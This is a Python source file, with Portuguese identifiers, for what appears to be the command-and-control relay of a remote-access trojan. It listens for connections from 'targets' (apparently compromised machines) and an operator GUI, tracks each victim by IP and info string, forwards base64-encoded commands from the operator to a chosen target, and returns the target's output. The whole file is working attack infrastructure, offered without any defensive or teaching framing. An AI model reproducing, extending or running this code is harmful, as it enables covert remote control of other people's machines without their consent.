import socket, os, threading, base64
from chave import enviar_msg, receber_msg

HOST = "0.0.0.0"
PORTA = int(os.environ.get("PORT", 9001))

alvos = {}
gui_conn = None
lock = threading.Lock()
prox_id = 1

def log(m): print(f"[RELAY] {m}", flush=True)

def enviar_gui(texto):
    with lock:
        if not gui_conn: return
        try: enviar_msg(gui_conn, texto)
        except Exception as e: log(f"ERRO ENVIO GUI: {e}")

def tratar_alvo(conn, addr, aid, info):
    ip = addr[0]
    with lock:
        for existente in alvos.values():
            if existente["ip"] == ip:
                log(f"DUPLICATA {ip} — FECHANDO")
                conn.close()
                return
        alvos[aid] = {"conn": conn, "ip": ip, "info": info}
    try:
        log(f"ALVO {aid} CONECTADO: {info}")
        enviar_gui(f"NOVO_ALVO|{aid}|{ip}|{info}")
        while True:
            dados = receber_msg(conn, raw=True)
            if not dados: break
            enviar_gui(f"RESPOSTA|{aid}|{base64.b64encode(dados).decode()}")
    finally:
        with lock: alvos.pop(aid, None)
        enviar_gui(f"SAIU_ALVO|{aid}")
        conn.close()

def tratar_gui(conn, addr):
    global gui_conn
    with lock: gui_conn = conn
    log("GUI CONECTADA")
    enviar_msg(conn, "OK_GUI")
    with lock:
        for aid, d in alvos.items():
            enviar_msg(conn, f"NOVO_ALVO|{aid}|{d['ip']}|{d['info']}")
    while True:
        txt = receber_msg(conn)
        if not txt: break
        if not txt.startswith("CMD|"): continue
        _, aid_b, dados_b64 = txt.split("|", 2)
        aid = int(aid_b)
        dados = base64.b64decode(dados_b64)
        with lock:
            if aid in alvos:
                alvos[aid]["conn"].sendall(dados)

def main():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORTA))
    srv.listen(10)
    log(f"OUVINDO NA PORTA {PORTA}")
    while True:
        conn, addr = srv.accept()
        try:
            conn.settimeout(3)
            prim = receber_msg(conn)
            conn.settimeout(None)
            if prim == "SOU_GUI":
                threading.Thread(target=tratar_gui, args=(conn, addr), daemon=True).start()
            else:
                global prox_id
                aid = prox_id; prox_id += 1
                threading.Thread(target=tratar_alvo, args=(conn, addr, aid, prim), daemon=True).start()
        except Exception as e:
            log(f"CONEXAO REJEITADA: {e}")
            conn.close()

if __name__ == "__main__": main()
#teste